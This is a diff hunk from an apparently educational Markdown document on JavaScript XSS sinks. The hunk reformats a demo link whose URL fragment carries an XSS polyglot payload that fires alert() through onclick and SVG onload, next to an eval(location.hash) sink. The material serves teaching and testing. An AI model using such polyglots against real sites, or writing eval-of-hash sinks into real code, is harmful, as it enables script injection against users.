@@ -181,7 +181,7 @@ _Demo: <https://jsbin.com/vovogo>_
 eval(location.hash.slice(1));
 
 ````
-_Demo: <https://jsbin.com/qejisu#jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E%3E>_
+_Demo: [https://jsbin.com/qejisu#jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E%3E](https://jsbin.com/qejisu#jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E%3E)_
 
 * __`setTimeout`:__
 ````javascript
